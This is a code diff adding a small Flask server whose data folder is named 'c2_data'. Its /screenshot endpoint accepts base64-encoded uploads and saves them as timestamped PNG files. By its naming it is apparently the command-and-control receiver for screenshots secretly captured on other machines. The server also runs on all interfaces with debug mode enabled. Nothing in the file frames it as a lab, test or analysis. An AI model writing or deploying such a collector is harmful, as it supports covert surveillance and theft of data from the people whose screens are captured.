@@ -1,0 +1,24 @@
+from flask import Flask, request, jsonify
+import base64
+import time
+import os
+
+app = Flask(__name__)
+data_dir = "c2_data"
+os.makedirs(data_dir, exist_ok=True)
+
+@app.route('/screenshot', methods=['POST'])
+def receive_screenshot():
+    try:
+        base64_data = request.data.decode('utf-8')
+        screenshot_path = os.path.join(data_dir, f"screenshot_{int(time.time())}.png")
+        with open(screenshot_path, 'wb') as f:
+            f.write(base64.b64decode(base64_data))
+        print(f"Screenshot saved: {screenshot_path}")
+        return {"status": "received"}
+    except Exception as e:
+        print(f"Error: {e}")
+        return {"status": "error", "message": str(e)}, 400
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000, debug=True)
